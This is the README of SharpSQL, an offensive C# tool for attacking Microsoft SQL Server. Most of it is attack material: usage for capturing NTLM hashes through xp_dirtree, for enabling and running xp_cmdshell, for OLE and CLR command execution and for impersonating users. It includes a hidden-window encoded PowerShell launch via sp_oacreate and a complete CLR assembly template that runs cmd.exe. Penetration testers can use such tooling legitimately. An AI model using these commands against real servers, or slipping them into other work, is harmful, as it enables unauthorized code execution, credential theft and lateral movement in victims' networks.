# SharpSQL

Simple port of PowerUpSQL
- Methods and options are case-insensitive e.g. `Get-SQLInstanceDomain`/`get-sqlinstancedomain` or `-Instance`/`-instance`
- `-Instance` required for all methods except `Get-SQLInstanceDomain` and `Check-SQLInstanceDomainAccess`

Thanks to [tevora-threat](https://github.com/tevora-threat) for getting the ball rolling.
This fork builds on the work of [mlcsec](https://github.com/mlcsec).
<br>

## Usage
```
SharpSQL fork by jannlemm0913, original by @mlcsec

Usage:

    SharpSQL.exe [Method] [-Instance <sql.server>] [-LinkedInstance <linked.sql.server>] [-User <user> -Password <password>] [-Command <whoami>] [-Query <query>]

Options:

    -Instance                  - The instance to target
    -Db                        - The db to connect to (default: master)
    -LinkedInstance            - The linked instance to target
    -Ip                        - The IP to xp_dirtree (share: /pwn)
    -User                      - SQL Server or domain account ("domain\user") to authenticate with.
    -Password                  - SQL Server or domain account password to authenticate with.
    -Impersonate               - The database user to impersonate
    -Command                   - The command to execute (default: whoami - Invoke-OSCmd, Invoke-LinkedOSCmd, Invoke-ExternalScript, and Invoke-OLEObject)
    -Query                     - The raw SQL query to execute
    -Verbose                   - Enable verbose output
    -Help                      - Show help

Methods:
    Get-SQLInstanceDomain           - Get SQL instances within current domain via user and computer SPNs (no parameters required)
    Check-SQLInstanceDomainAccess   - Checks access across all SQL instances within current domain
    Check-SQLInstanceAccess         - Checks access for specified SQL instance
    Get-Databases                   - Get available databases 
    Get-DBUser                      - Get database user via USER_NAME
    Get-GroupMembership             - Get group membership for current user ('guest' or 'sysadmin')
    Get-Hash                        - Get hash via xp_dirtree, works nicely with impacket-ntlmrelayx
    Get-ImpersonableUsers           - Get impersonable users 
    Get-LinkedServers               - Get linked SQL servers
    Get-LinkedPrivs                 - Get current user privs for linked server
    Get-Sysadmins                   - Get sysadmin users
    Get-SystemUser                  - Get system user via SYSTEM_USER
    Get-SQLQuery                    - Execute raw SQL query
    Get-Triggers                    - Get SQL server triggers
    Get-Users                       - Get users from syslogins
    Get-UserPrivs                   - Get current user server privileges
    Check-Cmdshell                  - Check whether xp_cmdshell is enabled on instance
    Check-LinkedCmdshell            - Check whether xp_cmdshell is enabled on linked server
    Clear-CLRAsm                    - Drop procedure and assembly (run before Invoke-CLRAsm if previous error)
    Enable-Cmdshell                 - Enable xp_cmdshell on instance
    Enable-LinkedCmdshell           - Enable xp_cmdshell on linked server
    Invoke-OSCmd                    - Invoke xp_cmdshell on instance
    Invoke-LinkedOSCmd              - Invoke xp_cmdshell on linked server
    Invoke-ExternalScript           - Invoke external python script command execution 
    Invoke-OLEObject                - Invoke OLE wscript command execution
    Invoke-CLRAsm                   - Invoke CLR assembly procedure command execution
    Invoke-UserImpersonation        - Impersonate database user and execute query
    Invoke-DBOImpersonation         - Impersonate dbo on msdb and execute query

Examples:

    SharpSQL.exe Get-SQLInstanceDomain
    SharpSQL.exe Check-SQLInstanceDomainAccess -User "sa" -Password "***"
    SharpSQL.exe Check-SQLInstanceAccess -Instance sql.server -User "DOMAIN\User" -Password "***"
    SharpSQL.exe Get-UserPrivs -Instance sql.server
    SharpSQL.exe Get-Sysadmins -Instance sql.server
    SharpSQL.exe Get-LinkedServers -Instance sql.server
    SharpSQL.exe Get-Hash -Instance sql.server -ip 10.10.10.10
    SharpSQL.exe Invoke-OSCmd -Instance sql.server -Command "whoami /all"
    SharpSQL.exe Invoke-LinkedOSCmd -Instance sql.server -LinkedInstance linked.sql.server -Command "dir C:\users\"
    SharpSQL.exe Invoke-CLRAsm -Instance sql.server -Command "whoami && ipconfig"
```

<br>

## Demos and Examples
### Get-GroupMembership
![image](https://user-images.githubusercontent.com/47215311/153180706-78e2a53c-79fb-4db0-ba03-cda16d476966.png)

### Get-SQLquery
![image](https://user-images.githubusercontent.com/47215311/153181678-6d61bb45-ff9b-4451-93ff-9497ab875bc5.png)

### Get-UserPrivs
![image](https://user-images.githubusercontent.com/47215311/153054239-3937a19a-5514-42fb-980c-4e1676f085ca.png)

### Invoke-OSCmd
![image](https://user-images.githubusercontent.com/47215311/153182593-e40747ff-b9f1-4ed4-a634-556f37e617ea.png)

### OLE Object via Impersonation
```
.\SharpSQL.exe invoke-userimpersonation -instance dc01 -impersonate sa -Query "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -exec bypass -nop -w hidden -enc blahblah';"
```

### Impersonation and xp_cmdshell
```
.\SharpSQL.exe invoke-userimpersonation -instance dc01 -impersonate sa -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

.\SharpSQL.exe invoke-userimpersonation -instance dc01 -impersonate sa -Query "EXEC xp_cmdshell 'whoami'"
```

### Command execution via CLR Assembly 
```
.\SharpSQL.exe Invoke-clrasm -instance sql01 -command "cd && ipconfig"
[*] Authenticated to: sql01
[*] Invoke-CLRAsm:
C:\Windows\system32

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.168.5
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.168.254
```
The following template is currently used for the custom CLR assembly:
```c#
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class ClassLibrary1
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec(SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
}
```
The method automatically deletes the created procedure and assembly after each invocation. However, if an error occurs you may have to clear this before the next call by using `Clear-CLRAsm`.



<br>



## Todo

- Test:
    - `Invoke-ExternalScript` - not tested in lab

- Fix:
    - `Enable-LinkedCmdshell` - rpc or metadata error currently, `Check-LinkedCmdshell` and `Invoke-LinkedOSCmd` work fine

- Add:
    - `Add-User`
    - `Add-LinkedUser`
    - `Enable-RPC` - on instance and linkedinstance, allows for EXEC... AT...
    - double link crawl functionality, raw queries should work as is
